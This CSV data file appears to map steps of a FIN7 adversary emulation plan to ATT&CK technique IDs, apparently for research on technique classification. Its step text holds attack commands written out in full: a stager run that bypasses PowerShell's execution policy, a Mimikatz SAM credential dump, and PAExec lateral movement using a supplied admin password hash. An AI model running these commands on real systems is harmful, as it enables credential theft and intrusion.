org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
fin7,fin7,unknown,fin7::1,1,Screenshot of end-users desktop,"id: eac2cf0f-7b51-44d2-83cb-57a34a29b7ff | name: Screenshot of end-users desktop | description: Take screenshots of end user's endpoint. | tactic: Collection | technique: attack_id: T1113 | name: Screen Capture | cti_source: https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/ | procedure_group: procedure_collection | procedure_step: 3.B | platforms: windows: psh,pwsh: command: powershell.exe C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\takeScreenshot.ps1
 | input_arguments: domain: description: The name of the target domain | type: string | default: hospitality | domain.admin.username: description: The username of the domain administrator | type: string | default: kmitnick | executors: name: powershell | command: powershell.exe C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\takeScreenshot.ps1
","[""T1113""]","[""T1113""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::2,2,Screen Capture,attack_id: T1113 | name: Screen Capture,"[""T1113""]","[""T1113""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::3,3,Execution of stager.ps1,"id: 82d2f5c7-7561-4d91-96d2-959473b9ad2b | name: Execution of stager.ps1 | description: Execution of previously placed stager. | tactic: Execution | technique: attack_id: T1059.003 | name: Command and Scripting Interpreter - Windows Command Shell | cti_source: https://blog.morphisec.com/fin7-attacks-restaurant-industry | procedure_group: procedure_execution | procedure_step: 4.A | platforms: windows: psh,pwsh: command: powershell.exe -ExecutionPolicy Bypass -NoExit -File C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\stager.ps1""
 | payloads: stager.ps1 | input_arguments: domain: description: The name of the target domain | type: string | default: hospitality | domain.admin.username: description: The username of the domain administrator | type: string | default: kmitnick | executors: name: powershell | command: powershell.exe -ExecutionPolicy Bypass -NoExit -File C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\stager.ps1""
","[""T1059.003""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::4,4,Command and Scripting Interpreter - Windows Command Shell,attack_id: T1059.003 | name: Command and Scripting Interpreter - Windows Command Shell,"[""T1059.003""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::5,5,Enumerate,"id: ab937ef4-7c66-4349-ad3b-658c41fcf4c5 | name: Enumerate | description: Perform process discovery (T1057) | tactic: Discovery/Execution | technique: attack_id: T1057 | name: Process Discovery | cti_source: https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf | procedure_group: procedure_discovery | procedure_step: 5.A.1 | platforms: windows: psh,pwsh: command: powershell.exe -c ""ps""
 | executors: name: powershell | command: powershell.exe -c ""ps""
","[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::6,6,Process Discovery,attack_id: T1057 | name: Process Discovery,"[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::7,7,Execute SAMCats (Mimikatz),"id: b15d3014-a5d1-4ec6-934b-d7fe44451192 | name: Execute SAMCats (Mimikatz) | description: Dump SAM via Mimikatz(T1003.002) | tactic: OS Credential Dumping | technique: attack_id: T1003.002 | name: OS Credential Dumping: Security Account Manager | cti_source: https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf | procedure_group: procedure_cred_access | procedure_step: 5.A.2 | platforms: windows: psh,pwsh: command: powershell.exe -ExecutionPolicy Bypass -NoExit -File ""C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\uac-samcats.ps1""
 | payloads: uac-samcats.ps1 | samcat.exe | input_arguments: domain: description: The name of the target domain | type: string | default: hospitality | domain.admin.username: description: The username of the domain administrator | type: string | default: kmitnick | executors: name: powershell | command: powershell.exe -ExecutionPolicy Bypass -NoExit -File ""C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\uac-samcats.ps1""
","[""T1003.002""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::8,8,OS Credential Dumping: Security Account Manager,attack_id: T1003.002 | name: OS Credential Dumping: Security Account Manager,"[""T1003.002""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::9,9,Expand Access to itadmin,"id: 9a76889c-9518-4b3e-9c87-6618156015c6 | name: Expand Access to itadmin | description: Leverage PAExec to laterally move and execute on itadmin | tactic: Lateral Movement | technique: attack_id: T1570 | name: Lateral Tool Transfer | cti_source: https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf | procedure_group: procedure_lat_movement | procedure_step: 6.A | platforms: windows: psh,pwsh: command: cmd.exe /c "".\paexec.exe \\#{itadmin.ip.address} -s -u #{domain}\#{domain.admin.username} -p #{domain.admin.hash} -c -csrc \"".\hollow.exe\"" hollow.exe""
 | payloads: hollow.exe | paexec.exe | input_arguments: domain: description: The name of the target domain | type: string | default: hospitality | domain.admin.username: description: The username of the domain administrator | type: string | default: kmitnick | domain.admin.hash: description: The password hash of the domain administrator | type: string | default: c3aa78cd0827b8e8603ac1c8996e6556 | itadmin.ip.address: description: The IP address of the itadmin workstation | type: string | default: 10.0.1.6 | executors: name: powershell | command: cmd.exe /c "".\paexec.exe \\#{itadmin.ip.address} -s -u #{domain}\#{domain.admin.username} -p #{domain.admin.hash} -c -csrc \"".\hollow.exe\"" hollow.exe""
","[""T1570""]","[""T1570""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::10,10,Lateral Tool Transfer,attack_id: T1570 | name: Lateral Tool Transfer,"[""T1570""]","[""T1570""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
